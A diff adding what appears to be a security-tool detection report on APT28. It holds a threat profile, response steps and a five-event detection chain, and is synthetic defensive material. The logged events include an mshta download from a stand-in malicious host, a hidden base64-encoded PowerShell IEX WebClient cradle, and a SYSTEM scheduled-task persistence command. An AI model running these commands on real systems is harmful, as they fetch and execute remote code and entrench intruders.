@@ -1,0 +1,56 @@
+# Active Threat: APT28 (APT, CRITICAL)
+Industries: Government, Defense, Energy
+Geographies: Europe, North America
+Summary: APT28 (Fancy Bear) is a Russian-linked threat actor associated with GRU Unit 26165. Known for spearphishing campaigns targeting government and defense sectors, frequently using living-off-the-land binaries and PowerShell for post-exploitation.
+Investigation: Look for clustered execution of WinRAR archive extraction, MSHTA invocations, encoded PowerShell commands, and scheduled task creation under the same user/host within a 30-minute window. Pivot on the hostname to enumerate lateral movement attempts.
+Mitigation: Patch CVE-2023-XXXX, enforce MFA on all privileged accounts, block executable email attachments, restrict MSHTA and Cscript/Wscript via AppLocker, monitor scheduled task creation by SYSTEM.
+Response: Isolate affected host, revoke credentials of involved user accounts, hunt for lateral movement through SMB and WMI, capture memory and disk for forensic analysis, notify CISO and prepare for potential disclosure.
+Threat actors:
+  - APT28: Russian GRU-linked advanced persistent threat group, also known as Fancy Bear, Sofacy, Sednit, Pawn Storm.
+
+# Chain
+chain_id: 6966fa87-8a76-5910-b216-61ffb99ec038
+hostname: WKST-FIN-05
+window_start: 2026-04-22T09:30:00Z
+first_seen: 2026-04-22T09:31:11Z
+last_seen: 2026-04-22T09:31:31Z
+coverage: 83.33%
+seqs hit: 1, 2, 3, 4, 5
+seqs missed: 6
+revision: 1
+
+# Events (5 of 5 shown)
+[1] Group seq=1 rule="Suspicious Execution From RAR Archive"
+    event_count: 1, first_seen: 2026-04-22T09:31:11Z, last_seen: 2026-04-22T09:31:11Z
+    techniques: T1204
+    representative event_id: evt-apt28-001
+    representative parsed_event:
+    {"command_line": "C:\\Program Files\\WinRAR\\WinRAR.exe x payload.rar", "parent_image": "C:\\Windows\\explorer.exe", "process_name": "WinRAR.exe"}
+
+[2] Group seq=2 rule="MSHTA Execution with Suspicious File Extensions"
+    event_count: 1, first_seen: 2026-04-22T09:31:16Z, last_seen: 2026-04-22T09:31:16Z
+    techniques: T1218.005
+    representative event_id: evt-apt28-002
+    representative parsed_event:
+    {"command_line": "mshta.exe http://malicious.example.com/payload.hta", "process_name": "mshta.exe"}
+
+[3] Group seq=3 rule="WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript"
+    event_count: 1, first_seen: 2026-04-22T09:31:21Z, last_seen: 2026-04-22T09:31:21Z
+    techniques: T1059.005
+    representative event_id: evt-apt28-003
+    representative parsed_event:
+    {"command_line": "wscript.exe payload.vbs", "process_name": "wscript.exe"}
+
+[4] Group seq=4 rule="PowerShell Base64 Encoded IEX Cmdlet"
+    event_count: 1, first_seen: 2026-04-22T09:31:26Z, last_seen: 2026-04-22T09:31:26Z
+    techniques: T1059.001
+    representative event_id: evt-apt28-004
+    representative parsed_event:
+    {"command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQA=", "process_name": "powershell.exe"}
+
+[5] Group seq=5 rule="Scheduled Task Creation Via Schtasks.EXE"
+    event_count: 1, first_seen: 2026-04-22T09:31:31Z, last_seen: 2026-04-22T09:31:31Z
+    techniques: T1053.005
+    representative event_id: evt-apt28-005
+    representative parsed_event:
+    {"command_line": "schtasks /create /tn WindowsUpdater /tr C:\\ProgramData\\winupd.exe /sc minute /mo 5 /ru SYSTEM", "process_name": "schtasks.exe"}
